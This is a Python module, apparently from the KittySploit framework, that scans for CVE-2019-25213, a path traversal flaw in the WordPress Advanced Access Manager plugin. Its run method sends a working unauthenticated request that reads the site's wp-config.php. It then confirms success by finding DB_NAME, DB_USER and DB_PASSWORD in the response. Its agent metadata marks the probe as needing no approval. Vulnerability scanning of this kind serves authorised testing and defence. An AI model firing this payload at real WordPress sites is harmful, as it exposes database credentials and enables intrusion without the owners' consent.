#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Advanced Access Manager plugin for WordPress is vulnerable to Unauthenticated Arbitrary File Read in versi."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Advanced Access Manager - Path Traversal Detection',
        'description': 'The Advanced Access Manager plugin for WordPress is vulnerable to Unauthenticated Arbitrary File Read in versions up to, and including, 5.9.8.1 due to insufficient validation on the aam-media parameter. This allows unauthenticated attackers to read any file on the server, including sensitive files such as wp-config.php',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'wp', 'advanced_access_manager', 'lfi', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/55e0f0df-7be2-4e18-988c-2cc558768eff?source=cve',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-25213',
        ],
        'cve': 'CVE-2019-25213',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=aam-media-load&aam-media=/wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_USER', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="WordPress Advanced Access Manager - Path Traversal detected",
                path='/wp-admin/admin-ajax.php?action=aam-media-load&aam-media=/wp-config.php',
            )
            return True
        return False

